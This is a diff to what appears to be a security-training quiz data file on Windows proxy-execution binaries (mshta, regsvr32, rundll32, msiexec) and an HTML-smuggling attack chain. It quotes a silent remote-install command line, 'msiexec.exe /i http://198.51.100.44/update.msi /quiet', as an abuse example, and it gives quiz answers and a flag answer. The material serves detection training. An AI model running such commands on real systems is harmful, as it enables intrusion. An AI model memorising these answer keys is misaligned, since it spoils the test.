@@ -300,22 +300,22 @@ export const roomsBatch49 = [
           {
             "id": "p1",
             "left": "mshta.exe (T1218.005)",
-            "right": "Running a locally-authored .hta file -- a lightweight HTML-plus-script GUI some enterprise installers and internal kiosk or help-desk tools still package this way"
+            "right": "Showing a small script-driven GUI that some enterprise installers and internal kiosk or help-desk tools still ship as a local file"
           },
           {
             "id": "p2",
             "left": "regsvr32.exe (T1218.010)",
-            "right": "Registering a COM DLL a software installer just copied to disk, run automatically by countless everyday setup programs immediately after installation"
+            "right": "Making a COM component that a setup program just copied to disk available to other applications, done automatically by countless installers"
           },
           {
             "id": "p3",
             "left": "rundll32.exe (T1218.011)",
-            "right": "Running a named function Windows itself relies on, such as opening the Display Settings Control Panel item or a printer-management dialog"
+            "right": "Calling one exported function of a system library, as when Windows opens the Display Settings Control Panel item or a printer-management dialog"
           },
           {
             "id": "p4",
             "left": "msiexec.exe (T1218.007)",
-            "right": "Installing or repairing any software packaged as an MSI file, whether double-clicked by a user or pushed fleet-wide by enterprise deployment tooling"
+            "right": "Installing or repairing packaged software, whether double-clicked by a user or pushed fleet-wide by enterprise deployment tooling"
           }
         ],
         "explanation": "Each pairing reflects this room's own description of that binary's ordinary purpose: mshta.exe runs HTML Applications, regsvr32.exe registers COM DLLs (routine installer behavior), rundll32.exe runs a named DLL function (including Windows' own Control Panel items), and msiexec.exe processes MSI installer packages. This is precisely why none of the four can simply be blocked outright by an allowlisting policy -- doing so would break normal, constant, legitimate Windows and software-installation behavior. Recognizing the legitimate baseline is what makes the abuse patterns (a remote URL where a local path belongs, a scriptlet where a real DLL function belongs) actually stand out.",
@@ -333,19 +333,19 @@ export const roomsBatch49 = [
           },
           {
             "id": "smuggle",
-            "text": "JavaScript inside the HTML decodes an embedded payload, builds a Blob, and triggers a local download -- the malicious file (e.g. an ISO) never crossed the network as a distinguishable file (T1027.006)"
+            "text": "JavaScript running in the browser decodes an embedded payload, builds a Blob, and saves it to disk as a file such as an ISO, which never crossed the network as a distinguishable file (T1027.006)"
           },
           {
             "id": "userexec",
-            "text": "Victim double-clicks the resulting file, and Windows runs the malicious script or shortcut inside it (T1204.002, User Execution: Malicious File)"
+            "text": "A double-click mounts a container, and Windows runs the malicious script or shortcut inside it (T1204.002, User Execution: Malicious File)"
           },
           {
             "id": "proxy",
-            "text": "That script invokes a trusted, signed Windows binary (e.g. rundll32.exe) to run the attacker's actual code, so the visible process is a trusted name, not an unknown one (T1218.x, System Binary Proxy Execution)"
+            "text": "A trusted, signed Windows binary (e.g. rundll32.exe) runs the attacker's actual code, so the visible process is a trusted name, not an unknown one (T1218.x, System Binary Proxy Execution)"
           },
           {
             "id": "fetch",
-            "text": "The proxy-executed code reaches out to attacker infrastructure to retrieve a further-stage payload (T1105, Ingress Tool Transfer -- the loaded VaporRage stage downloading shellcode)"
+            "text": "An in-memory shellcode downloader such as VaporRage reaches out to attacker infrastructure for its payload (T1105, Ingress Tool Transfer)"
           }
         ],
         "correct_order": [
@@ -363,13 +363,13 @@ export const roomsBatch49 = [
         "id": "hsl-q3",
         "question": "Per this room's readings, which of the following command lines is the strongest indicator of msiexec.exe being abused for proxy execution, rather than a routine software installation?",
         "options": [
-          "msiexec.exe /i http://185.221.20.44/update.msi /quiet -- installing silently from an unfamiliar external IP with no tie to a known vendor or deployment repository",
-          "msiexec.exe /i \\\\FS01\\Software\\agent_v4.2.msi /quiet -- installing silently from the organization's internal software share that IT uses for deployments",
-          "msiexec.exe /i C:\\Windows\\CCM\\Cache\\WarehouseScan_v4.2.msi /qn -- installing silently from the SCCM client cache during a deployment window",
-          "msiexec.exe /fa C:\\Windows\\Installer\\{GUID}.msi -- repairing an installed application from its cached installer database entry"
+          "msiexec.exe /i http://198.51.100.44/update.msi /quiet",
+          "msiexec.exe /i \\\\FS01\\Software\\agent_v4.2.msi /quiet",
+          "msiexec.exe /i C:\\Windows\\CCM\\Cache\\WarehouseScan_v4.2.msi /qn",
+          "msiexec.exe /fa C:\\Windows\\Installer\\{GUID}.msi"
         ],
         "answer": 0,
-        "explanation": "This room's rundll32/msiexec reading names the installation SOURCE as the key discriminator: a routine install references a known, catalogued repository or vendor location, while an abused invocation references an MSI from an unexpected network location with no established relationship to the organization. The silent install from http://185.221.20.44 is exactly that unfamiliar remote source. The FS01 software-share install is also a network path and also silent, but the source is the organization's own known software share -- a catalogued repository, which this reading treats as routine. The SCCM-cache install comes from the local SCCM cache, a recognized deployment tool's directory. The /fa command is a repair that references Windows' own local installer cache, which this reading does not treat as suspicious on its own.",
+        "explanation": "This room's rundll32/msiexec reading names the installation SOURCE as the key discriminator: a routine install references a known, catalogued repository or vendor location, while an abused invocation references an MSI from an unexpected network location with no established relationship to the organization. The silent install from http://198.51.100.44 is exactly that unfamiliar remote source. The FS01 software-share install is also a network path and also silent, but the source is the organization's own known software share -- a catalogued repository, which this reading treats as routine. The SCCM-cache install comes from the local SCCM cache, a recognized deployment tool's directory. The /fa command is a repair that references Windows' own local installer cache, which this reading does not treat as suspicious on its own.",
         "xp": 25
       },
       {
@@ -472,9 +472,9 @@ export const roomsBatch49 = [
         "type": "flag" as const,
         "id": "hsl-f1",
         "logTask": "hsl-la1",
-        "prompt": "In this room’s regsvr32 log-analysis case on host LT-THN-4471, the command line fetched a COM scriptlet from a remote server. Enter the exact filename of that scriptlet as it appears in the URL.",
+        "prompt": "In this room’s regsvr32 log-analysis case on host LT-THN-4471, the command line names three files. Two ship with Windows; the third is the attacker’s, and it is the one to hunt for across proxy logs and other hosts. Enter that file’s name exactly as the command line shows it.",
         "answer": "invoice_svc.sct",
-        "hint": "Look back at the regsvr32 command line in that case: the scriptlet is the .sct file at the end of the http:// URL. Enter only the filename, not the full URL.",
+        "hint": "Reading 6 says which parts of a Squiblydoo command line are genuine Windows components. Enter only the filename, not the full URL.",
         "xp": 15
       },
       {
